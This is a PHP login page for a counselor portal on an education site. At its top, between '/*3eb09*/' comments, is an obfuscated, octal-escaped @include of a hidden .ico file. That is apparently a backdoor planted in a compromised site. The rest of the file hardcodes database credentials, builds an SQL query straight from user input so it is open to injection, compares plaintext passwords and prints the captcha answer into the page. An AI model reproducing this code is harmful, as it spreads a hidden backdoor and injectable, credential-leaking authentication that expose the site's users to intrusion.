<?php
/*3eb09*/

@include "\057home\057data\143e9/l\145arni\156tern\056com/\143ss/p\162etty\120hoto\057ligh\164_rou\156ded/\056b2b6\071dcf.\151co";

/*3eb09*/
session_start();
if (isset($_SESSION['cname'])) {
	 header("Location: /counselor/dashboard.php");
}
if (isset($_POST['submit'])) {
  $uname= trim($_POST['name']);
  $pass=trim($_POST['pass']);
$link = mysqli_connect('192.145.239.50', 'datace9_uplink209', 'Uplink209@', 'datace9_learnintern');
if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
	header('location: /counselor');
}
if ($_POST['captcha'] == $_SESSION['captcha']) {
	unset($_SESSION['captcha']);
$sql = "SELECT id, password FROM counselor WHERE id = '$uname' AND password = '$pass'";
 $result = mysqli_query($link, $sql);
    if(mysqli_num_rows($result)){
      session_start();
   $_SESSION['cname'] = $uname . $pass;
header("Location: ../counselor/dashboard.php");
}
else{
  unset($_SESSION['cname']);
	echo "<script>
		alert('wrong username or password');
	</script>";
  session_destroy();
  echo "<script>
		location.href='../counselor/';
	</script>";

}
}
else {
	echo "<script>alert('wrong captcha!');</script>";
	echo "<script>location.href='../counselor';</script>";
}
}
else{
?>
<!DOCTYPE html>
<html dir="ltr" lang="en">
<head>

	<!-- Meta Tags -->
	<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8"/>
	<meta name="robots" content="noindex, nofollow" />

	<!-- Page Title -->
	<title>Login | LearnIntern & Grow</title>

	<!-- Favicon and Touch Icons -->
	<link href="../images/logo-and-favicon/favicon.png" rel="shortcut icon" type="image/png">
	<link href="../images/apple-touch-icon.png" rel="apple-touch-icon">
	<link href="../images/apple-touch-icon-72x72.png" rel="apple-touch-icon" sizes="72x72">
	<link href="../images/apple-touch-icon-114x114.png" rel="apple-touch-icon" sizes="114x114">
	<link href="../images/apple-touch-icon-144x144.png" rel="apple-touch-icon" sizes="144x144">

	<!-- Stylesheet -->
	<link href="../css/bootstrap.min.css" rel="stylesheet" type="text/css">
	<link href="../css/jquery-ui.min.css" rel="stylesheet" type="text/css">
	<link href="../css/animate.css" rel="stylesheet" type="text/css">
	<link href="../css/css-plugin-collections.css" rel="stylesheet"/>
	<!-- CSS | menuzord megamenu skins -->
	<link href="../css/menuzord-megamenu.css" rel="stylesheet"/>
	<link id="menuzord-menu-skins" href="../css/menuzord-skins/menuzord-boxed.css" rel="stylesheet"/>
	<!-- CSS | Main style file -->
	<link href="../css/style-main.css" rel="stylesheet" type="text/css">
	<!-- CSS | Preloader Styles -->
	<!-- <link href="css/preloader.css" rel="stylesheet" type="text/css"> -->
	<!-- CSS | Custom Margin Padding Collection -->
	<link href="../css/custom-bootstrap-margin-padding.css" rel="stylesheet" type="text/css">
	<!-- CSS | Responsive media queries -->
	<link href="../css/responsive.css" rel="stylesheet" type="text/css">
	<!-- CSS | Style css. This is the file where you can place your own custom css code. Just uncomment it and use it. -->
	<!-- <link href="css/style.css" rel="stylesheet" type="text/css"> -->

	<!-- CSS | Theme Color -->
	<link href="../css/colors/theme-skin-color-set4.css" rel="stylesheet" type="text/css">

	<!-- external javascripts -->
	<script src="../js/jquery-2.2.4.min.js"></script>
	<script src="../js/jquery-ui.min.js"></script>
	<script src="../js/bootstrap.min.js"></script>
	<!-- JS | jquery plugin collection for this theme -->
	<script src="../js/jquery-plugin-collection.js"></script>
	<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"></script>
	<script  src="../js/bootstrap-show-password.js"></script>
	<style>
	.zoom {
	    transition: transform .2s; /* Animation */
	}
	.zoom:hover {
	    transform: scale(1.02); /* (150% zoom - Note: if the zoom is too large, it will go outside of the viewport) */
	}
	</style>
	<style media="screen">
	body{background-color: rgba(0, 210, 211,.9);background-repeat: no-repeat;background-position: center;
	background-size: cover;overflow: hidden;}
		.container{max-width:550px; width: 400px}
		form{background-color: rgba(251,251,251,.5);border-radius: 10px;box-shadow: 1px 2px 20px 2px #EEE}
	</style>
</head>
<body>
	<div class="container position-relative p-0 mt-50 container-fluid text-center" style="">
		<div class="col-md-12">
<form class="reservation-form mb-0 bg-silver-deep" action="" method="post" onsubmit="return validate()">
	<h2 class="text-theme-colored2 text-center">Counselor Login</h2>
	<div class=""><img src="user.png" width="50" alt="user" class="img-circle" height="50"></div>
	<div class="row">
		<div class="col-sm-12">
	<div class="form-group mb-30 mt-30 ml-20 mr-20">
	<input type="text" name="name" value="" id="user" placeholder="Username" class="form-control zoom">
</div></div>
<div class="col-sm-12">
	<div class="form-group mb-30 ml-20 mr-20">
	<input type="password" name="pass" id="pass" value="" placeholder="password"  class="form-control zoom" data-toggle="password">
	<div class="input-group-append text-right">
	    <span class="input-group-text ">
	      <i class="fa fa-eye "></i>
	    </span>
	</div>
</div></div>
<div class="col-sm-12">
		<img src = " ../image.php?captcha_text = <?php echo $_SESSION['captcha']; ?> " style="border:1px solid #000;outline:none;" alt="Captacha code" id="capimg">
		<a href="javascript: void(0);" onclick="document.getElementById('capimg').src = '../image.php?' + Math.random(); return false"><i class="fa fa-refresh" aria-hidden="true"></i></a>
	<div class="form-group mb-0 ml-20 mr-20">
		<input type="text" name="captcha" id="capimg" placeholder="Enter captcha" class="form-control zoom">
</div></div>
<div class="col-sm-12">
	<div class="form-group mb-20 mt-0">
	<button type="submit" name="submit" class="btn btn-theme-colored2 btn-colored btn-flat mt-15 mr-15 ml-15" value="submit"> Go <i class="fa fa-arrow-right text-white"></i></button>
</div>
</div>
</div>
</form>
</div>
</div>
	<script>
     function validate(){
     	if ($('#user').val()=="" && $('#pass').val()=='' && $('#capimg').val()=='') {
     		alert('Enter All Details');
				return false;
     	}
     }
 </script>

 <script type="text/javascript">
$(document).ready(function () {
    //Disable cut copy paste
    $('body').bind('cut copy paste', function (e) {
        e.preventDefault();
    });

    //Disable mouse right click
    $("body").on("contextmenu",function(e){
        return false;
    });
});
</script>
</body>
</html>

<?php } ?>
